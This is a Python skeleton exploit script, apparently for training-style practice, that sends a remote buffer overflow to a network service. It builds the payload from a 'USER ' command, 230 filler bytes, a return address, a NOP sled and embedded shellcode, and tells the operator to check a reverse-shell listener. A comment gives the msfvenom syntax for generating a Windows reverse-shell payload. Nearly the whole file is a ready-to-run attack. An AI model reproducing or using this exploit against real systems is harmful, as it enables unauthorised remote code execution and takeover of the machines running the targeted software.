#!/usr/bin/python

#SKELETON SCRIPT FOR FUZZING SOFTWARES REMOTELY, USEFUL FOR OVERFLOWS OVER THE NETWORK
#ALWAYS MODIFY SHELLCODE!!!!!
#Follow me on twitter @acc3ssp0int

import socket
import sys
import time


if len(sys.argv) < 3:
	print("Usage: python 06-exploit.py $TargetIP $Port")
	sys.exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cmd = 'USER ' #Modify This as per software
junk = '\x41' * 230  #Modify This as per software
eip = '\x53\x93\x42\x7e' #Modify This as Target OS
nops = '\x90' * 20

#Customise this using msfvenom
#Common Syntax: msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -b "badcharlist" -f c > outfile
shellcode = ("\xd9\xe8\xba\x44\xd3\x2c\xa0\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x17\x03\x56\x17\x83\xaa\x2f\xce\x55\xce\x38\x8d"
"\x96\x2e\xb9\xf2\x1f\xcb\x88\x32\x7b\x98\xbb\x82\x0f\xcc\x37"
"\x68\x5d\xe4\xcc\x1c\x4a\x0b\x64\xaa\xac\x22\x75\x87\x8d\x25"
"\xf5\xda\xc1\x85\xc4\x14\x14\xc4\x01\x48\xd5\x94\xda\x06\x48"
"\x08\x6e\x52\x51\xa3\x3c\x72\xd1\x50\xf4\x75\xf0\xc7\x8e\x2f"
"\xd2\xe6\x43\x44\x5b\xf0\x80\x61\x15\x8b\x73\x1d\xa4\x5d\x4a"
"\xde\x0b\xa0\x62\x2d\x55\xe5\x45\xce\x20\x1f\xb6\x73\x33\xe4"
"\xc4\xaf\xb6\xfe\x6f\x3b\x60\xda\x8e\xe8\xf7\xa9\x9d\x45\x73"
"\xf5\x81\x58\x50\x8e\xbe\xd1\x57\x40\x37\xa1\x73\x44\x13\x71"
"\x1d\xdd\xf9\xd4\x22\x3d\xa2\x89\x86\x36\x4f\xdd\xba\x15\x18"
"\x12\xf7\xa5\xd8\x3c\x80\xd6\xea\xe3\x3a\x70\x47\x6b\xe5\x87"
"\xa8\x46\x51\x17\x57\x69\xa2\x3e\x9c\x3d\xf2\x28\x35\x3e\x99"
"\xa8\xba\xeb\x0e\xf8\x14\x44\xef\xa8\xd4\x34\x87\xa2\xda\x6b"
"\xb7\xcd\x30\x04\x52\x34\xd3\xeb\x0b\x8e\xa2\x84\x49\xee\x85"
"\xd9\xc7\x08\xaf\xf1\x81\x83\x58\x6b\x88\x5f\xf8\x74\x06\x1a"
"\x3a\xfe\xa5\xdb\xf5\xf7\xc0\xcf\x62\xf8\x9e\xad\x25\x07\x35"
"\xd9\xaa\x9a\xd2\x19\xa4\x86\x4c\x4e\xe1\x79\x85\x1a\x1f\x23"
"\x3f\x38\xe2\xb5\x78\xf8\x39\x06\x86\x01\xcf\x32\xac\x11\x09"
"\xba\xe8\x45\xc5\xed\xa6\x33\xa3\x47\x09\xed\x7d\x3b\xc3\x79"
"\xfb\x77\xd4\xff\x04\x52\xa2\x1f\xb4\x0b\xf3\x20\x79\xdc\xf3"
"\x59\x67\x7c\xfb\xb0\x23\x8c\xb6\x98\x02\x05\x1f\x49\x17\x48"
"\xa0\xa4\x54\x75\x23\x4c\x25\x82\x3b\x25\x20\xce\xfb\xd6\x58"
"\x5f\x6e\xd8\xcf\x60\xbb")

end = '\r\n' #Modify This as per software

buffer = cmd + junk + eip + nops + shellcode + end

print("Created by acc3ssp0int, follow my content on https://acc3ssp0int.com, Thanks!")
time.sleep(3)
print("Passing Buffer in 3 seconds...")
time.sleep(3)
s.connect((host,port))
s.recv(1024)
s.send(buffer)
s.recv(1024)
s.close()
print("Done! Check your listener :)")
time.sleep(1)
print("Exiting...")
time.sleep(1)
